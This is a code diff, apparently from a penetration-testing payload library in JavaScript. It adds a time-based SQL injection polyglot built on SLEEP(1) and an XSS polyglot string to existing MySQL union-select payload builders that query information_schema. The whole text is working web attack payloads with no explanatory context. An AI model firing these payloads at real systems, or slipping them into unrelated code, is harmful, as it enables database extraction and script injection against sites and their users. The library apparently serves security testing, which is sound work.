@@ -5,6 +5,10 @@ Payload.SQLi = {
     return value.replace(/[^\S\r\n]+/g, '/**/')
   },
 
+  polyglot: function (value) {
+    return "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
+  },
+
   'MySQL': class {
     static unionSelect ({ columns, position }) {
       columns = parseInt(columns)
@@ -119,6 +123,12 @@ Payload.SQLi = {
       return 'union select ' + fields.join(',') +
         " from information_schema.columns where table_schema='public'"
     }
+  }
+}
+
+Payload.XSS = class {
+  static polyglot (value) {
+    return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
   }
 }
 
